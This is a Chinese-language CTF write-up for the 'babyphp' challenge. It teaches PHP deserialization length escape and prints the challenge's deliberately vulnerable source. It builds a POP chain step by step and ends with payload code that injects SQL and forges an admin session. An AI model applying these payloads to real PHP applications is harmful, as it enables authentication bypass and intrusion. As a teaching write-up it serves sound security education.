> 原文链接: https://www.anquanke.com//post/id/200200 


# 从春秋公益赛babyphp学习反序列化长度逃逸


                                阅读量   
                                **838009**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01ac9f3ab31a7c4ec1.png)](https://p4.ssl.qhimg.com/t01ac9f3ab31a7c4ec1.png)



如果同学对于反序列化很熟练，只是被题目绕乱了，那我就不浪费你的时间了，这题解法思路如下：

实例化一个UpdateHelper对象，将sql属性赋值为User对象，将sql这个User对象里的nickname赋值为Info对象，将age赋值为咱们自己的sql语句，将nickname这个Info对象的CtrlCase属性赋值为dbCtrl对象，再将里面的name和password赋值为admin，最后把整个数据post到update.php里。

Pop链如下：

Update方法反序列化我们的序列化字符串后 -&gt; 触发UpdateHelper类里的析构 -&gt; 然后触发User里的toString -&gt; 接着触发Info类里的call -&gt; 再触发dbCtrl类里的login -&gt; 把我们的sql语句带入执行 -&gt; 完成$_SESSION[‘token’]=’admin’的赋值语句。

我们可以直接在返回包的set-cookie字段里获取到admin的phpsessionid，伪造cookie登录就拿到flag。

如果你看不懂我在说什么，那么请认真往下看，你就一定能通过这题，学会什么叫反序列化长度逃逸，并且知道这个题目的完整做题思路。



## 反序列化长度逃逸

```
&lt;?php

class User

`{`

public $c="";

public $a="";

`}`

class User_2`{``}`

$new_1 = new User();

?&gt;
```

打印$new之后结果如下这个是大家都知道的。

```
O:4:"User":2`{`s:1:"c";s:0:"";s:1:"a";s:0:"";`}`
```

反序列化其实是把这个字符串重新还原成对象的一个过程。那我们可不可以自己手动修改修改字符串呢？当然可以，只要符合规则，一样可以在你修改后成功反序列化回去。

比如我要让反序列化之后的对象能多一个b属性，那就可以这么修改

```
O:4:"User":3:`{`s:1:"c";s:0:"";s:1:"a";s:0:"";s:1:"b";s:0:"";`}`
```

再比如我不仅要添加一个属性，我还希望这个添加的属性值本身就是一个对象，我可以这么修改

```
O:4:"User":3:`{`s:1:"c";s:0:"";s:1:"a";s:0:""s:1:"b";O:6:"User_2":0:`{``}`;`}`
```

这样一来，还原出来的就会是这样：

```
User Object

(

[c] =&gt;

[a] =&gt;

[b] =&gt; User_2 Object

(

)

)
```

大家仔细对比，我们原来并没有b这个属性，还原后不仅多了b属性，而且b属性还是一个对象！

我们凭空多还原出了一个对象，甚至都没有经过类模板的使用。

这就会导致一个典型的反序列化漏洞，叫反序列化长度逃逸漏洞。

反序列化漏洞的成因就是因为unserialize中的参数可控，导致运行脚本后有！新！的！对！象！产生，导致类模板里的魔术方法被调用，产生非预期效果。简单概括一句话，就是你得有新对象产生。

反序列化长度逃逸，是一种进阶的反序列化漏洞利用方式，和我们一般的反序列化漏洞有所不同在于，unserialize的参数并不是我们可以任意输入的，而是已经固定好的一个序列化字符串。

但是这个序列化字符串在经过serialize序列化函数作用，并且自身的几个参数已经固定了以后，又被人为的修改了一次，才进入了反序列化函数还原对象。这次的修改甚至可以给结果直接添加一个新对象，也就符合了我们反序列化的要求。

比如原来是a在序列化固定好了以后是：

```
s:48:"unionunionunionunionunionunionunionunion";s:1:"1"
```

上面的这个序列化字符串中，s:48的全部内容是：

```
unionunionunionunionunionunionunionunion";s:1:"1
```

而不是

```
unionunionunionunionunionunionunionunion
```

但是现在写这个代码的人又犯傻了，做了一件什么事情呢，他在序列化字符串后，又写了一个函数，把敏感字符union给全部替换成为hacker，那么此时a是不是变成了：

```
s:48:"hackerhackerhackerhackerhackerhackerhackerhacker";s:1:"1"
```

这个时候我们的s:48内容就变成了

```
hackerhackerhackerhackerhackerhackerhackerhacker
```

而后面的

```
s:1:"1
```

则成为了这个序列化字符串中的新元素。



## 例题文件：

拿到题目首先就是4个文件，其中很明显有登录的部分：

/index.php

```
&lt;?php

require_once "lib.php";



if(isset($_GET['action']))`{`

require_once(__DIR__."/".$_GET['action'].".php");

`}`

else`{`

if($_SESSION['login']==1)`{`

echo "&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;";

`}`

else`{`

echo "&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;";

`}`

`}`

?&gt;
```

别想那个看上去好像文件包含，首题目不会这么简单真的就让你这样，输入了[php://filter](php://filter)以后报了502错误，这里有一个DIR做前缀绕不过去的。

/login.php

前端补贴了，无非是接受数据的框框。看后端就可以了

```
&lt;?php

require_once('lib.php');

?&gt;

&lt;?php

$user=new user();

if(isset($_POST['username']))`{`

if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['username']))`{`

die("&lt;br&gt;Damn you, hacker!");

`}`

if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['password']))`{`

die("Damn you, hacker!");

`}`

$user-&gt;login();

`}`

?&gt;
```

/update.php

```
&lt;?php

require_once('lib.php');

echo '&lt;html&gt;

&lt;meta charset="utf-8"&gt;

&lt;title&gt;update&lt;/title&gt;

&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;

&lt;/html&gt;';

if ($_SESSION['login']!=1)`{`

echo "你还没有登陆呢！";

`}`

$users=new User();

$users-&gt;update();

if($_SESSION['login']===1)`{`

require_once("flag.php");

echo $flag;

`}`

?&gt;
```

/lib.php

比较长，做过的同学可以跳过了，没做过这题的同学留个印象。

```
&lt;?php

error_reporting(0);

session_start();

function safe($parm)`{`

    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");

    return str_replace($array,'hacker',$parm);

`}`

class User

`{`

    public $id;

    public $age=null;

    public $nickname=null;

    public function login() `{`

        if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))`{`

        $mysqli=new dbCtrl();

        $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?');

        if($this-&gt;id)`{`

        $_SESSION['id']=$this-&gt;id;

        $_SESSION['login']=1;

        echo "你的ID是".$_SESSION['id'];

        echo "你好！".$_SESSION['token'];

        echo "&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;";

        return $this-&gt;id;

        `}`

    `}`

`}`

    public function update()`{`

        $Info=unserialize($this-&gt;getNewinfo());

        $age=$Info-&gt;age;

        $nickname=$Info-&gt;nickname;

        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);

        

        //这个功能还没有写完 先占坑

    `}`

    public function getNewInfo()`{`

        $age=$_POST['age'];

        $nickname=$_POST['nickname'];

        return safe(serialize(new Info($age,$nickname)));

    `}`

    public function __destruct()`{`

        return file_get_contents($this-&gt;nickname);//危

    `}`

    public function __toString()

    `{`

        $this-&gt;nickname-&gt;update($this-&gt;age);

        return "0-0";

        #$this-&gt;nickname=new Info()

    `}`

`}`

class Info`{`

    public $age;

    public $nickname;

    public $CtrlCase;

    public function __construct($age,$nickname)`{`

        $this-&gt;age=$age;

        $this-&gt;nickname=$nickname;

    `}`   

    public function __call($name,$argument)`{`

        echo $this-&gt;CtrlCase-&gt;login($argument[0]);

    `}`

`}`

Class UpdateHelper`{`

    public $id;

    public $newinfo;

    public $sql;

    public function __construct($newInfo,$sql)`{`

        $newInfo=unserialize($newInfo);

        $upDate=new dbCtrl();

    `}`

    public function __destruct()

    `{`

        echo $this-&gt;sql;

        #$this-&gt;sql=new User()则触发tostring()

    `}`

`}`

class dbCtrl

`{`

    public $hostname="127.0.0.1";

    public $dbuser="noob123";

    public $dbpass="noob123";

    public $database="noob123";

    public $name;

    public $password;

    public $mysqli;

    public $token;

    public function __construct()

    `{`

        $this-&gt;name=$_POST['username'];

        $this-&gt;password=$_POST['password'];

        $this-&gt;token=$_SESSION['token'];

    `}`

    public function login($sql)

    `{`

        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);

        if ($this-&gt;mysqli-&gt;connect_error) `{`

            die("连接失败，错误:" . $this-&gt;mysqli-&gt;connect_error);

        `}`

        $result=$this-&gt;mysqli-&gt;prepare($sql);

        $result-&gt;bind_param('s', $this-&gt;name);

        $result-&gt;execute();

        $result-&gt;bind_result($idResult, $passwordResult);

        $result-&gt;fetch();

        $result-&gt;close();

        if ($this-&gt;token=='admin') `{`

            return $idResult;

        `}`

        if (!$idResult) `{`

            echo('用户不存在!');

            return false;

        `}`

        if (md5($this-&gt;password)!==$passwordResult) `{`

            echo('密码错误！');

            return false;

            

        `}`

        $_SESSION['token']=$this-&gt;name;

        return $idResult;

    `}`

    public function update($sql)

    `{`

        //还没来得及写

    `}`

`}`
```



## 分析

我们进入最直接的分析：

这题到底在做什么？

我们先不管flag，这题很明显是一个登录的系统，登录了就能在update页面拿到flag。

那这个登录系统如何判断你有没有登录呢，是看你的session[‘login’]是否为1。

/update.php:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ed370c5485383bc4.png)

那么问题来了，session[‘login’]这个值什么情况下等于1呢？在lib.php有说明

/lib.php

[![](https://p3.ssl.qhimg.com/t01dc7b39062e7de43c.png)](https://p3.ssl.qhimg.com/t01dc7b39062e7de43c.png)

我们看到id的值来源于mysqli对象调用的login方法，只要这个方法返回的值不是0或者空值或者false，那么甚至都不需要返回1，就可以进入if条件判断，使得session[‘login’]=1，然后会以登录状态，跳转到update.php

那么你首先得能够触发user类，才可以动这里的mysql吧，哪里有用到user类呢，在login.php里面我们看到直接new了一个user类的对象。

（php类名不区分大小写，别纠结这个U和u，出题人可能腹黑，可能手误，但是不应该影响你解题。）

/login.php

[![](https://p4.ssl.qhimg.com/t01a88bd6a05af1ed19.png)](https://p4.ssl.qhimg.com/t01a88bd6a05af1ed19.png)

并且，这里限制只有你post了username才可以进入login方法。

假设我们这里post了一个username，那么进入User类的login方法。

此时在User类里又会检测你有没有post username和password。

当然这里有过滤。

/lib.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ba479337a2b3c9d3.png)

假设我们都post了，也没有触发过滤，然后继续往下。

这里又出现了一个login，此login非彼login，这里的login是mysqli调用的，而mysqli则是实例化了一个dbCtrl类的对象出来。

所以这里的login是dbCtrl类里的login方法，很多人看乱也是有这里的原因。

/lib.php 中的login方法

[![](https://p4.ssl.qhimg.com/t01e968a11cd590f95b.png)](https://p4.ssl.qhimg.com/t01e968a11cd590f95b.png)

我们跟入dbCtrl类里看看，这个也在lib.php里：

/lib.php 中的dbCtrl类

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d4a6484c95617a75.png)

这里的login会把一条查询sql语句给带入，这里的问号?是pdo数据查询特有的占位符，不懂的同学去了解一下pdo查询。

跟进来发现这里直接将我们post的username和password赋值给了name和password属性。然后设置token属性为session的值。

我们之前在User类里的那条sql查询语句也被带入到这里的login方法中，然后看到进行了占位符的替换，将$this-&gt;name这个值替换了原来的？，而我们的name属性就是我们post的username。

也就是说其实这里执行的就是一个sql查询，你输入了username，后台会查询这个对应名字的密码，返回的是$idResult和$passwordResult结果。

然后会把你输入的password的md5值和后台比较。

如果存在该用户名就会给你返回id序列号和密码。

如果不存在或者密码错误，那只能返回false。

/lib.php 中的dbCtrl类

[![](https://p5.ssl.qhimg.com/t014083b0bfbbb53edd.png)](https://p5.ssl.qhimg.com/t014083b0bfbbb53edd.png)

两个没有用到的类和两个没有用到的方法

重点来了！

Lib.php总共就四个类，User，Info，UpdateHelper，dbCtrl类这四个。

分析到了这里其实会发现，除掉正常登录

有：
<td valign="top">两个类UpdateHelper，Info三个User类里面的方法getNewInfo，destruct，toString方法</td>

没有用到，所以这些没有用到的方法和类一定就是解题的关键了！

/lib.php Info类

[![](https://p5.ssl.qhimg.com/t018c4ce7b155139ffb.png)](https://p5.ssl.qhimg.com/t018c4ce7b155139ffb.png)

构造方法这个没啥好说的，就是把传进来的，也就是我们任意post的两个数据
1. age
1. nickname
变成age属性和nickname属性。

往下看：

call方法是在当你调用了某个对象的类模板中不存在的方法时会触发。

留下一个问题，call怎么能够触发呢？

我们先假设，如果这里触发了call方法，那么就会进一步调用CtrlCase属性在调用他的login方法。

欸？我这句话自己读起来都难受，不通顺，属性怎么能调用方法呢，只有对象才能调用吧，

那这不就明摆着暗示我们这里的$this-&gt;CtrlCase咱们得想办法让他变成一个对象才可以调用之后的login方法。

有login方法的类有两个，一个是User，一个是dbCtrl，这个在开头就提到了。

那到底实例化哪一个类呢，怎么才能让$this-&gt;CtrlCase成为一个实例化的类呢，我们必须看看别的多余部分代码。

/lib.php UpdateHelper类

看完了Info类，就还剩下UpdateHelper类

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01643f2b4a8f235fb5.png)

这个时候发现这个类有意思了，居然有一个反序列化函数，看参数能不能任意控制，发现是newInfo，那么这个参数哪里来呢，找到lib.php调用UpdateHelper类模板的地方：

在User类的update方法里：

[![](https://p5.ssl.qhimg.com/dm/1024_196_/t01d3cfbb9cffd6ee9e.png)](https://p5.ssl.qhimg.com/dm/1024_196_/t01d3cfbb9cffd6ee9e.png)

整个代码就这一个地方调用了UpdateHelper类模板，所以咱们的newInfo肯定就是传进来的session[‘id’]这个值了，那不用想了，这个值服务器才能使用，我们这里控制不了。

继续往下看析构函数：发现有一个echo，打印的是sql，这个sql很显然就是我们传进来的第二个参数（对上去发现是info变量）

是不是还有点联系不起来，没有关系，我们不是还有最后一个多余的方法没有看嘛。

/lib.php User类的toString方法

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014a2ff62c44c4d263.png)

现在这里有三个东西，

一个是User的tostring，一个是UpdateHelper的析构有一个echo，一个是info的call方法里有一个echo。

到底这三个什么关系？？？

toString需要有echo直接输出一个存在的对象，call需要调用一个对象里面不存在的方法，UpdateHelper的析构平白无故的echo了一个值。

说来说去，我们发现这里少了一个很重要的东西，少了一个对象啊！tostring和call的触发不都需要对象吗？

这个对象得是什么，才能够把这三个看似毫无关联的方法和类联系起来呢？

首先看这个对象应该是谁的值，咱们这三个里面能直接触发不需要任何条件的，只剩下UpdateHelper里的析构了，这个析构是只要你使用了这个类模板，那结束的时候就会销毁对象触发（啥时候对象被销毁呢，就是找到这个脚本最后一句有关操作这个对象的代码，或者你脚本结束了，这两个情况你就可以当作这个对象在这一句代码之后或者这一刻之后被销毁了）。

那没跑了，UpdateHelper的析构echo $this-&gt;sql这个肯定先触发。

有同学有疑惑，欸，我这个都没有使用UpdateHelper类模板，怎么能触发这个析构？

啧，你说如果正好有个反序列化函数反序列化了一个UpdateHelper对象的序列化字符串就好了是吧。

欸这个地方怎么突然就被我看到了一个反序列化？

[![](https://p1.ssl.qhimg.com/t01d564c971fd040657.png)](https://p1.ssl.qhimg.com/t01d564c971fd040657.png)

哦原来是User类里的update方法。

你说要是再有个咱们能访问的文件，能使用这个方法就好了是吧

/update.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cc157988fb1540a8.png)

这么巧啊，在update.php里面就使用了User类里的update方法。

你说要是这个地方再能够任意传个参数是不是就更好了啊！

[![](https://p4.ssl.qhimg.com/t01d33088939d9ab6d6.png)](https://p4.ssl.qhimg.com/t01d33088939d9ab6d6.png)

怎么这么巧这个update方法里的反序列化函数的参数是调用一个叫getNewinfo方法获得的。

这不就是我们要的任意输入吗？

所以我们只要在update.php页面直接post一个序列化之后的UpdateHelper对象就好了啊。

反序列化后，UpdateHelper对象总会被销毁吧，对象销毁的时候就会调用UpdateHelper类里的析构，导致echo $this-&gt;sql ，而且当这个$this-&gt;sql又是一个User类的对象时，还会触发User类里的toString方法。

[![](https://p2.ssl.qhimg.com/t017177f908fad5ab3d.png)](https://p2.ssl.qhimg.com/t017177f908fad5ab3d.png)

所以我们poc的第一版有了：

得先弄一个UpdateHelper对象。而且这个对象里面的sql属性还得是个User对象。

```
$user = new User();

$payload = new UpdateHelper("", "");

$payload-&gt;sql = $user;
```

继续分析，这个toString怎么和call联系起来，他要求是咱们能够访问一个对象不存在的方法。那toString访问的是update方法，是在User类里的，call方法是在Info里的，那不是很明显，这个$this-&gt;nickname必须得是Info类才能触发这个call了吗？

所以，当nickname是一个Info类的对象的时候，就会调用Info类里的call，使得$this-&gt;CtrlCase访问login。

[![](https://p5.ssl.qhimg.com/t01272936f1085bf018.png)](https://p5.ssl.qhimg.com/t01272936f1085bf018.png)

好了又来到login，咱们开头说login有几个呢？

两个，一个User类里，一个dbCtrl类里

咱们总不能再绕回去用User里的login吧…就算回去也会被嵌套的login给带到dbCtrl里去，那我们还不如直接就去dbCtrl里。而且最终登录没登录，还是看你dbCtrl。

所以这个$this-&gt;CtrlCase合理的赋值应该是一个dbCtrl对象，我们也应该调用dbCtrl里的方法，争取和这个session[‘login’]==1更近一点。

好了咱们poc第二版有了

```
$user = new User();

$user-&gt;nickname = new Info("", "");



$db = new dbCtrl();

$user-&gt;nickname-&gt;CtrlCase = $db;



$payload = new UpdateHelper("", "");

$payload-&gt;sql = $user;
```

那么我们继续想，这里的$argument是啥呢：

看call方法的定义

```
function __call(string $function_name, array $arguments)

`{`

    // 方法体

`}`
```

所以这里的$name就是我们的update，而$arguments则是update方法里的参数构成的数组，所以$arguments[0]就是我们的this-&gt;age值。

这里想，如果能控制dbCtrl类里的login就好了，如果他能任意执行我们想要的sql语句就好了，那还登录什么，这么大个的一句$_SESSION[‘token’]赋值语句，再把this-&gt;name设置成为admin，不是就拿到admin cookie了，然后替换cookie登录就直接进去了。密码都不需要。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0198fb63f4d69a1f25.png)

可惜这句话前面还有一个md5判断呢，你密码对不上就返回报错了啊

[![](https://p1.ssl.qhimg.com/t01c80cf40bb218ffe5.png)](https://p1.ssl.qhimg.com/t01c80cf40bb218ffe5.png)

啧，那你说要是咱们能让这个md5($this-&gt;password)!==$passwordResult恒为真就好了

要是$this-&gt;password这个是admin，后面那个是admin的md5该多好啊

$this-&gt;password直接就是个public，那不是直接在实例化dbCtrl类的时候就赋值了吗？

那$passwordResult这个东西改不了吧？他得是select id,password from user where username=?的查询结果呢

这问号是啥呢？

$this-&gt;name!

能赋值不？

能！

那这sql语句是咋进来的呢？

传进来的

从哪里传进来的呢？

从login参数传进来的

咱们上面调用login时的参数是啥呢

是$this-&gt;CtrlCase-&gt;login($argument[0])的$argument[0]

$argument[0]是啥呢？

$this-&gt;age！

谁的this-&gt;age呢

Info对象的

哪里来的Info对象呢

User对象里面nickname属性被赋值了Info对象！

User对象咋来的呢？

UpdateHelper对象里的sql属性被赋值了User对象！

UpdateHelper对象怎么来的呢？

我们自己实例化后，再变成序列化字符串传进去的，传到update.php里执行了update方法被反序列化函数还原出来的！

那咱们能控制sql语句不！

能！

那什么sql语句能查询出admin的md5呢？

select  “21232f297a57a5a743894a0e4a801fc3”;

那这里语句还需要查个idResult出来呢？

[![](https://p1.ssl.qhimg.com/t0114a00bb4fc2e5c82.png)](https://p1.ssl.qhimg.com/t0114a00bb4fc2e5c82.png)

select  “1” , “21232f297a57a5a743894a0e4a801fc3”;

好了poc第三版有了

```
$user = new User();

$user-&gt;nickname = new Info("", "");

$user-&gt;age = 'select "1", "21232f297a57a5a743894a0e4a801fc3"';



$db = new dbCtrl();

$db-&gt;password = "admin";

$db-&gt;name = "admin";

$user-&gt;nickname-&gt;CtrlCase = $db;



$payload = new UpdateHelper("", "");

$payload-&gt;sql = $user;
```

但是咱们要post的是直接serialize 这个实例化成UpdateHelper对象的$payload就可以了吗？

当然不是，来看我们post进去之后在哪里

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0157419f1bae39a2b8.png)

Post进去是变成了实例化Info对象用的参数了啊，这不是和我们的想法不一样吗？

没有关系，还记得反序列化长度逃逸吗？

他这里设置了safe函数来过滤序列化之后的敏感字符，那就给了我们空间去改变这个序列化字符串了！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017f8b47277d6c666e.png)

他把union等替换成了hacker，不正是如同开头所说，可以直接多出一个字符吗？那我如果根据序列化的规则添加字符，不是就可以多还原一个对象了吗？

多一个对象你得添加这些东西

“s:1:”1″;你要的对像序列化字符串;

你要的对象序列化字符串已经有了，就是咱们辛苦构造的那个new UpdateHelper，直接serialize就可以得到

但是前面这个”s:1:”1”;呢，当然也是用反序列化长度逃逸了。

怎么构造这个溢出呢，就是你需要溢出多长，就写多少个union，每一个union被替换为hacker的时候，都可以为你增加一个字符的溢出长度。

所以我们的payload有了最终版

```
$user = new User();

$user-&gt;age = 'select "1", "21232f297a57a5a743894a0e4a801fc3"';

$user-&gt;nickname = new Info("", "");

$db = new dbCtrl();

$db-&gt;password = "admin";

$db-&gt;name = "admin";

$user-&gt;nickname-&gt;CtrlCase = $db;

$payload = new UpdateHelper("", "");

$payload-&gt;sql = $user;

$payload_age = 'unionunionunionunionunionunionunionunion";s:1:"1';

$payload_nickname = '";' . serialize($payload) . '`}`';

$payload_nickname = str_repeat("union", strlen($payload_nickname)) . $payload_nickname;
```

至于需要什么class，自己添加就好了

然后得到的

```
'age' =&gt; $payload_age,

'nickname' =&gt; $payload_nickname
```

作为post参数，post到update.php页面。



## 结论

实例化一个UpdateHelper对象，将sql属性赋值为User对象，将sql这个User对象里的nickname赋值为Info对象，将age赋值为咱们自己的sql语句，将nickname这个Info对象的CtrlCase属性赋值为dbCtrl对象，再将里面的name和password赋值为admin，最后把整个数据post到update.php里。

Pop链如下：

Update方法反序列化我们的序列化字符串后 -&gt; 触发UpdateHelper类里的析构 -&gt; 然后触发User里的toString -&gt; 接着触发Info类里的call -&gt; 再触发dbCtrl类里的login -&gt; 把我们的sql语句带入执行 -&gt; 完成$_SESSION[‘token’]=’admin’的赋值语句。

我们可以直接在返回包的set-cookie字段里获取到admin的phpsessionid，并且使得返回值idResult为1，使得下面的语句得以执行

[![](https://p1.ssl.qhimg.com/t0193c37bef3d889cb9.png)](https://p1.ssl.qhimg.com/t0193c37bef3d889cb9.png)

使得当前的这个cookie对应的$_SESSION[‘login’]!=1

[![](https://p3.ssl.qhimg.com/t0100f393d313a22d07.png)](https://p3.ssl.qhimg.com/t0100f393d313a22d07.png)

然后我们带着这个sessionid去登录，则结果就是登录成功

[![](https://p5.ssl.qhimg.com/dm/1024_419_/t012d43e535e35337cf.png)](https://p5.ssl.qhimg.com/dm/1024_419_/t012d43e535e35337cf.png)

最后再带着这个cookie访问一下update.php就拿到flag了
